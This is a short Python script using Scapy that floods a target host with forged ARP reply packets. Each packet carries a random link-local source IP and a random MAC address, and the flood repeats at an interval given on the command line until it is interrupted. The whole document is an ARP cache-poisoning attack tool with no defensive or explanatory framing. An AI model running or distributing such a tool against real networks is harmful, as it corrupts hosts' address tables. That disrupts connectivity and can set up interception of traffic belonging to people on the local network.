from scapy.all import *
import sys
import time

def posion(host, spam_interval):
    try:
        src = RandIP('169.254.0.0/16')
        msrc = RandMAC()
        while True:
            packet = ARP(op=2, pdst=host, psrc=src, hwsrc=msrc)
            print(packet.summary())
            sendp(packet, verbose=False)
            time.sleep(spam_interval)

    except KeyboardInterrupt:
        pass

if __name__ == '__main__':
    if len(sys.argv) < 3 or len(sys.argv) > 3:
        print("Invalid Arguments")
    else:
        host = sys.argv[1]
        spam_interval = int(sys.argv[2])
        posion(host, spam_interval)
